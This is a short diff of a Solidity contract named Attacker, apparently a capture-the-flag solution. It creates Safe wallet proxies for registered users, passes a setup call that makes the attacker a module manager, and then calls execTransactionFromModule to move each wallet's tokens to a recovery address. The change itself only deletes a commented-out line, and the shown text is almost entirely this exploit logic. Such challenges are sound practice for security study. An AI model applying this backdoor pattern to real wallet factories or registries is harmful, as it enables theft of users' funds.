@@ -44,7 +44,6 @@ contract Attacker {
             user[0] = users[i]; 
             initializers[i] = abi.encodeCall(Safe.setup, (user, 1, address(notSafe), abi.encodeCall(NotSafe.addModuleManager, address(this)), address(0), address(0), 0, payable(address(0))));
             walletFactory.createProxyWithCallback(address(singletonCopy), initializers[i], i, walletRegistry);
-            // bytes memory exec = abi.encodeCall(token.transfer, (player, 0, abi.encodeCall(token.transfer, (player, 10)), Enum.Operation.Call));
             bytes memory exec = abi.encodeCall(ModuleManager.execTransactionFromModule, (address(token), 0, abi.encodeCall(token.transfer, (recovery, 10e18)), Enum.Operation.Call));
             (bool success,) = walletRegistry.wallets(users[i]).call(exec);
             if (!success) {revert("failed");}
